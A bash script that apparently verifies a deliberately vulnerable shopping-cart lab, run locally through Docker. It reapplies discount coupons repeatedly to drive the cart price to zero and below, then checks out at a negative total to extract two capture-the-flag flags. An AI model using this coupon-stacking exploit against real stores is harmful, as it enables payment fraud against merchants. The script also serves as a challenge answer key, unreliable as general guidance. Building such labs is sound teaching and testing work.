#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
sleep 3

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

until nc -z -w2 127.0.0.1 8095 2>/dev/null; do sleep 1; done

CJAR=$(mktemp /tmp/cookies-XXXXXX.txt)

# Test 1: initial cart price is $100
OUT=$(curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8095/cart 2>/dev/null)
check "initial cart price is \$100.00" "$( echo "$OUT" | grep -q '100.00' && echo 1 || echo 0 )"

# Test 2: applying a valid coupon reduces price
OUT=$(curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8095/coupon/apply \
    -H "Content-Type: application/json" \
    -d '{"code":"SAVE15"}' 2>/dev/null)
check "SAVE15 reduces price" "$( echo "$OUT" | grep -q '85.00' && echo 1 || echo 0 )"

# Test 3: same coupon can be applied again (the bug)
OUT=$(curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8095/coupon/apply \
    -H "Content-Type: application/json" \
    -d '{"code":"SAVE15"}' 2>/dev/null)
check "SAVE15 can be applied a second time (no dedup)" "$( echo "$OUT" | grep -q '"SAVE15"' && echo 1 || echo 0 )"
TWO_COUPONS=$(echo "$OUT" | python3 -c "import json,sys; d=json.load(sys.stdin); print(len([c for c in d.get('coupons_applied',[]) if c=='SAVE15']))" 2>/dev/null || echo "0")
check "coupons_applied shows SAVE15 twice" "$( [ "${TWO_COUPONS:-0}" -ge 2 ] && echo 1 || echo 0 )"

# Test 4: apply FLAT5 ($5 flat discount) 20 times to reach $0, get flag1
# FLAT5 is a fixed $5 discount; 20 applications bring $100 to exactly $0
FLAG1=""
for i in $(seq 1 25); do
    OUT=$(curl -s -c "$CJAR" -b "$CJAR" \
        -X POST http://127.0.0.1:8095/coupon/apply \
        -H "Content-Type: application/json" \
        -d '{"code":"FLAT5"}' 2>/dev/null)
    F=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
    [ -n "$F" ] && FLAG1="$F"
done
check "repeated FLAT5 drives price to 0 and reveals flag1" "$( [ -n "$FLAG1" ] && echo 1 || echo 0 )"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"

# Test 5: checkout with negative price gets flag2
# Already negative after 25 FLAT5 applications (20 to $0, 5 more to -$25)
OUT=$(curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8095/checkout \
    -H "Content-Type: application/json" \
    -d '{}' 2>/dev/null)
FLAG2=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "checkout with negative price returns flag2" "$( [ -n "$FLAG2" ] && echo 1 || echo 0 )"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"

rm -f "$CJAR"
$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
